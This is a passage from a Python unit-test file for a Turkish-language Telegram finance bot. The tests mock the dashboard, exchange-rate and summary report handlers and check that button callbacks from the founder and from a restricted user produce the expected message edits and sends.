                "id": "cq_dash_1",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": -100123}, "message_id": 999},
                "data": "cfo_dashboard"
            }
        }
        with patch.object(bot, "cfo_dashboard_raporu_uret", return_value=("Dashboard Metni", {"inline_keyboard": []})) as mock_d, \
             patch.object(bot, "telegramMesajDuzenle") as mock_edit:
            bot._process_telegram_update_core(cq_dash)
            mock_d.assert_called_once()
            mock_edit.assert_called_once()
            self.assertEqual(mock_edit.call_args[0][2], "Dashboard Metni")

        # 2. menu_kur callback'i
        cq_kur = {
            "callback_query": {
                "id": "cq_kur_1",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": -100123}, "message_id": 999},
                "data": "menu_kur"
            }
        }
        with patch.object(bot, "canliKurSorgula_impl", return_value=("Canlı Kur Metni", {"inline_keyboard": []})) as mock_k, \
             patch.object(bot, "telegramMesajDuzenle") as mock_edit:
            bot._process_telegram_update_core(cq_kur)
            mock_k.assert_called_once()
            mock_edit.assert_called_once()
            self.assertEqual(mock_edit.call_args[0][2], "Canlı Kur Metni")

    def test_kisitli_yetkili_button_execution(self):
        """Kısıtlı yetkili kullanıcının izinli butonları sorunsuz çalıştırabildiğini test eder."""
        kisitli_id = 876543210
        with patch.dict(bot.app_state, {"KISITLI_YETKILILER": {kisitli_id: {"username": "KisitliTest", "allowed_commands": {"/kasa"}}}}):
            # rapor_ozet butonu
            cq_ozet = {
                "callback_query": {
                    "id": "cq_kisitli_1",
                    "from": {"id": kisitli_id},
                    "message": {"chat": {"id": -100123}, "message_id": 999},
                    "data": "rapor_ozet"
                }
            }
            with patch.object(bot, "hizliOzetUret_impl", return_value="Özet Raporu") as mock_ozet, \
                 patch.object(bot, "telegramMesajGonder") as mock_send:
                bot._process_telegram_update_core(cq_ozet)
                mock_ozet.assert_called_once()
                mock_send.assert_called_once()
                self.assertIn("Özet Raporu", mock_send.call_args[0][1])

            # canli_kur_yenile butonu
            cq_kur = {
                "callback_query": {
                    "id": "cq_kisitli_2",
                    "from": {"id": kisitli_id},
                    "message": {"chat": {"id": -100123}, "message_id": 999},
                    "data": "canli_kur_yenile"
                }
            }
            with patch.object(bot, "canliKurSorgula_impl", return_value=("Kur Raporu", {"inline_keyboard": []})) as mock_kur, \
                 patch.object(bot, "telegramMesajDuzenle") as mock_edit:
                bot._process_telegram_update_core(cq_kur)
                mock_kur.assert_called_once()
                mock_edit.assert_called_once()
                self.assertEqual(mock_edit.call_args[0][2], "Kur Raporu")

if __name__ == "__main__":
    unittest.main()





